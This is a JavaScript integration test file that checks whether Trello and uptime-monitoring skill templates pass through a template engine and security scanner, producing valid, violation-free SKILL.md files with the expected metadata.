const engine = new TemplateEngine({ ncUrl: 'https://nc.example.com', ncUser: 'moltagent' });
const scanner = new SecurityScanner();

// -----------------------------------------------------------------------------
// Pipeline: Template -> Engine -> Scanner -> Valid SKILL.md
// -----------------------------------------------------------------------------

test('TC-SF-INT-001: Full pipeline — Trello template produces safe SKILL.md', () => {
  const params = { board_name: 'Project Phoenix', board_id: 'a1B2c3D4' };

  // Step 1: Assemble
  const { content, metadata } = engine.assemble(TRELLO_TEMPLATE, params);

  // Step 2: Scan (include NC domain in allowed_domains as real usage would)
  const scanConfig = {
    allowed_domains: [...TRELLO_TEMPLATE.security.allowed_domains, 'nc.example.com'],
  };
  const scanResult = scanner.scan(content, scanConfig);

  // Step 3: Verify
  assert.strictEqual(scanResult.safe, true, `Violations: ${scanResult.violations.join(', ')}`);
  assert.strictEqual(scanResult.violations.length, 0);

  // Verify content structure
  assert.ok(content.startsWith('---\n'), 'Should start with YAML frontmatter');
  assert.ok(content.includes('name: trello-project-phoenix'), 'Should have slugified skill name');
  assert.ok(content.includes('Manage Trello board "Project Phoenix"'), 'Should have board name in description');
  assert.ok(content.includes('Board ID: a1B2c3D4'), 'Should have board ID');
  assert.ok(content.includes('https://api.trello.com/'), 'Should reference Trello API');

  // Verify metadata
  assert.strictEqual(metadata.template_id, 'trello-board');
  assert.strictEqual(metadata.template_version, '1.0');
  assert.ok(metadata.generated_at, 'Should have generation timestamp');
  assert.strictEqual(metadata.forge_version, '1.0.0');
});

test('TC-SF-INT-002: Full pipeline — uptime template produces safe SKILL.md', () => {
  const params = { target_url: 'https://example.com' };

  const { content, metadata } = engine.assemble(UPTIME_TEMPLATE, params);

  // Uptime template has empty allowed_domains, so we pass the target domain
  const scanConfig = { allowed_domains: ['example.com'], forbidden_patterns: [] };
  const scanResult = scanner.scan(content, scanConfig);

  assert.strictEqual(scanResult.safe, true, `Violations: ${scanResult.violations.join(', ')}`);
  assert.ok(content.includes('name: uptime-https-example-com'), 'Should have slugified URL as name');
  assert.ok(content.includes('Monitor https://example.com'), 'Should have target URL');
  assert.strictEqual(metadata.template_id, 'uptime-check');
});

